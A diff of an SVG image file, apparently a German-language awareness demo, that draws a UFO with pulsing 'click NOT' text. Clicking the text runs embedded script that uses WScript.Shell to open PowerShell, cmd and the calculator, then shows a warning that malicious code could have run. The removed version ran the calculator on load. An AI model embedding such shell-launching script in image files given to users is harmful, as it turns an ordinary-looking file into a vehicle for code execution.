@@ -1,9 +1,21 @@
-// SVG das ein Bild anzeigt, den Calculator öffnet und ein PopUp Fenster startet
+// SVG das ein Bild anzeigt, und APPS öffnet
 
-<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
-  <!-- Script zum Öffnen des Calculators und Anzeigen eines Popups -->
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
+  <!-- Script zum Öffnen von PowerShell, CMD und Calculator -->
   <script type="application/javascript">
     <![CDATA[
+      function openPowerShell() {
+        // Öffnet PowerShell auf Windows-Systemen
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("powershell");
+      }
+
+      function openCmd() {
+        // Öffnet die CMD (Eingabeaufforderung) auf Windows-Systemen
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("cmd");
+      }
+
       function openCalculator() {
         // Öffnet den Calculator (calc) auf Windows-Systemen
         var shell = new ActiveXObject("WScript.Shell");
@@ -12,18 +24,59 @@
 
       function showPopup() {
         // Zeigt ein Popup-Fenster mit einer Nachricht
-        alert("Hallo!");
+        alert("Hallo! Durch deinen Klick, hätte Schadcode ausgeführt werden können! - Klicke NIEMALS auf unbekannte Felder");
       }
 
-      // Aufrufen der Funktionen
-      showPopup();
-      openCalculator();
+      // Event-Listener für das Klick-Ereignis auf den Text
+      function handleClick() {
+        showPopup();
+        openPowerShell();
+        openCmd();
+        openCalculator();
+      }
     ]]>
   </script>
 
-  <!-- Ein einfaches Bild, das das SVG darstellt (z.B. ein Kreis) -->
-  <circle cx="100" cy="100" r="50" stroke="black" stroke-width="3" fill="yellow"/>
-  <text x="50%" y="50%" font-size="20" text-anchor="middle" dy=".3em" fill="black">PoWn3d!</text>
+  <!-- Ein UFO mit Schattenschatteneffekten -->
+  <defs>
+    <filter id="f1" x="0" y="0" width="150%" height="150%">
+      <feOffset result="offOut" in="SourceAlpha" dx="5" dy="5" />
+      <feGaussianBlur result="blurOut" in="offOut" stdDeviation="3" />
+      <feBlend in="SourceGraphic" in2="blurOut" mode="normal" />
+    </filter>
+
+    <!-- Animation für den pulsierenden Text -->
+    <style>
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.1);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+    </style>
+  </defs>
+
+  <!-- UFO Unterseite (Ellipse) -->
+  <ellipse cx="150" cy="180" rx="100" ry="30" fill="gray" filter="url(#f1)" />
+
+  <!-- UFO Oberseite (Ellipse) -->
+  <ellipse cx="150" cy="120" rx="80" ry="40" fill="silver" />
+
+  <!-- UFO Lichter (Kreise) -->
+  <circle cx="120" cy="180" r="6" fill="yellow" />
+  <circle cx="150" cy="180" r="6" fill="blue" />
+  <circle cx="180" cy="180" r="6" fill="red" />
+
+  <!-- Der Text mit kleinerer Schriftgröße -->
+  <text x="50%" y="50%" font-size="16" text-anchor="middle" dy=".3em" fill="red" font-family="Arial, sans-serif" font-weight="bold" stroke="black" stroke-width="1px" onclick="handleClick()" style="animation: pulse 1.5s infinite;">
+    Klicke NICHT! auf den Text
+  </text>
 </svg>
+
 
 //By DaUfooo 2025
